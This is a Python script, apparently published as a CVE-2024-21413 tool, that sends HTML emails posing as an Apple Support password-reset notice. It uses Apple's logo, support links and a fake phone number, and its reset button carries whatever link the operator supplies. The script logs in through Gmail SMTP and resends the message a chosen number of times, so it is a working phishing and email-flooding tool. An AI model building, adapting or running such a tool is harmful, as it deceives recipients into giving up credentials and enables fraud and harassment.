import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import argparse
from colorama import Fore, Style, init
import re  # For email validation

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header():
    print(f"{colors.HEADER}{colors.BOLD}{'='*90}")
    print(f"{colors.OKBLUE}{colors.BOLD}Email Sending Script CVE-2024-21413{colors.ENDC} Developed by https://github.com/ThemeHacker")
    print(f"{colors.HEADER}{'='*90}{colors.ENDC}")

def ascii_emailtools():
    print("")
    init(autoreset=True)
    art = [
        "███████╗███╗   ███╗ █████╗ ██╗██╗         ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "██╔════╝████╗ ████║██╔══██╗██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "█████╗  ██╔████╔██║███████║██║██║            ██║   ██║   ██║██║   ██║██║     ███████╗",
        "██╔══╝  ██║╚██╔╝██║██╔══██║██║██║            ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "███████╗██║ ╚═╝ ██║██║  ██║██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝"
    ]
    
    colors_list = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    
    for i, line in enumerate(art):
        print(colors_list[i % len(colors_list)] + line)

def is_valid_email(email):
    """Check if the provided email is valid."""
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email) is not None

def send_email(receiver_email, subject, link_content=None, email_number=1):
    sender_email = os.getenv('SENDER_EMAIL')
    sender_password = os.getenv('SENDER_PASSWORD')

    if not sender_email or not sender_password:
        print(f"{colors.FAIL}Error: Sender email and password must be set in environment variables.{colors.ENDC}")
        return

    if not is_valid_email(receiver_email):
        print(f"{colors.FAIL}Error: Invalid recipient email address: {receiver_email}.{colors.ENDC}")
        return

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Create HTML content
    html_content = f"""\
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
  <head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <meta name="x-apple-disable-message-reformatting">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="telephone=no" name="format-detection">
    <title></title>
  </head>
  <body class="body">
    <div dir="ltr" class="es-wrapper-color">
      <table width="100%" cellspacing="0" cellpadding="0" class="es-wrapper">
        <tbody>
          <tr>
            <td valign="top" class="esd-email-paddings">
              <table cellpadding="0" cellspacing="0" align="center" class="es-content">
                <tbody>
                  <tr>
                    <td align="center" class="esd-stripe">
                      <table bgcolor="#ffffff" align="center" cellpadding="0" cellspacing="0" width="600" class="es-content-body">
                        <tbody>
                          <tr>
                            <td align="left" class="esd-structure es-p15t es-p20r es-p20l">
                              <table cellpadding="0" cellspacing="0" width="100%">
                                <tbody>
                                  <tr>
                                    <td width="560" align="center" valign="top" class="esd-container-frame">
                                      <table cellpadding="0" cellspacing="0" width="100%">
                                        <tbody>
                                          <tr>
                                            <td align="center" class="esd-block-image es-p10t es-p10b" style="font-size:0px">
                                              <a target="_blank" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
                                                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" height="65">
                                              </a>
                                            </td>
                                          </tr>
                                          <tr>
                                            <td align="center" esd-links-underline="none" class="esd-block-text es-p15t es-p15b es-p40r es-p40l es-m-p0r es-m-p0l es-text-4908">
                                              <h1 class="es-m-txt-c">
                                                <span class="es-text-mobile-size-16" style="font-size: 16px; line-height: 120% !important">Password re</span><span class="es-text-mobile-size-16 es-text-mobile-size-18" style="font-size: 18px; line-height: 120% !important">​</span><span class="es-text-mobile-size-16" style="font-size: 16px; line-height: 120% !important">set ​</span>
                                              </h1>
                                            </td>
                                          </tr>
                                          <tr>
                                            <td align="left" class="esd-block-text es-p10t">
                                              <p>
                                                Hi {receiver_email}
                                              </p>
                                              <p>
                                                After you click the button, you'll be asked to complete the following steps:
                                              </p>
                                              <ol>
                                                <li>
                                                  Enter a new password.
                                                </li>
                                                <li>
                                                  Confirm your new password.
                                                </li>
                                                <li>
                                                  Click Submit.
                                                </li>
                                              </ol>
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                          <tr>
                            <td align="left" class="esd-structure es-p20b es-p20r es-p20l">
                              <table cellpadding="0" cellspacing="0" width="100%">
                                <tbody>
                                  <tr>
                                    <td width="560" align="center" valign="top" class="esd-container-frame">
                                      <table cellpadding="0" cellspacing="0" width="100%" style="border-radius:5px;border-collapse:separate">
                                        <tbody>
                                          <tr>
                                            <td align="center" class="esd-block-button es-p10t es-p10b">
                                              <span class="es-button-border" style="border-radius: 6px; background: #01aaff">
                                                <a href="" target="_blank" class="es-button" style="border-left-width: 30px; border-right-width: 30px; border-radius: 6px; background: #01aaff; mso-border-alt: 10px solid #01aaff">
                                                  <p><a href="{link_content}" class="link">RESET YOUR PASSWORD</a></p>
                                                </a>
                                              </span>
                                            </td>
                                          </tr>
                                          <tr>
                                            <td align="center" class="esd-block-text es-p10t">
                                              <h3 class="es-m-txt-c" style="line-height:150%">
                                                This link is valid for one use only. Expires in 5 min.
                                              </h3>
                                            </td>
                                          </tr>
                                          <tr>
                                            <td align="center" class="esd-block-text es-p10t es-p10b">
                                              <p style="line-height:150%">
                                                If you didn't request to reset your&nbsp;password, please disregard this message or contact our customer service department.
                                              </p>
                                            </td>
                                          </tr>
                                          <tr>
                                            <td align="left" class="esd-block-html">
                                              <footer>
                                                <p>
                                                  Thanks,
                                                  <br>
                                                  <a href="https://support.apple.com" class="link">
                                                    Apple Support
                                                  </a>
                                                  <br>
                                                  <a href="mailto:support@apple.com" class="link">
                                                    support@apple.com
                                                  </a>
                                                  | (800) 555-0199
                                                </p>
                                              </footer>
                                            </td>
                                          </tr>
                                        </tbody>
                                      </table>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </td>
                          </tr>
                        </tbody>
                      </table>
                    </td>
                  </tr>
                </tbody>
              </table>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </body>
</html>
    """

    msg.attach(MIMEText(html_content, 'html'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print(f"{colors.OKGREEN}Email sent successfully {email_number} to {receiver_email}.{colors.ENDC}")
    except smtplib.SMTPAuthenticationError:
        print(f"{colors.FAIL}Authentication failed. Check your email and password.{colors.ENDC}")
    except smtplib.SMTPConnectError:
        print(f"{colors.FAIL}Could not connect to the SMTP server. Check your network settings.{colors.ENDC}")
    except Exception as e:
        print(f"{colors.FAIL}Failed to send email {email_number} to {receiver_email}: {e}{colors.ENDC}")

if __name__ == "__main__":
    os.system('clear')
    print_header()
    ascii_emailtools()

    parser = argparse.ArgumentParser(description='Send emails using Gmail SMTP.')
    parser.add_argument('--recipient', required=True, help='Recipient email address')
    parser.add_argument('--subject', required=True, help='Subject of the email')
    parser.add_argument('--link', required=False, help='Optional link to include in the email')
    parser.add_argument('--count', type=int, required=True, help='Number of times to send the email')

    args = parser.parse_args()

    for i in range(1, args.count + 1):
        send_email(args.recipient, args.subject, args.link, i)
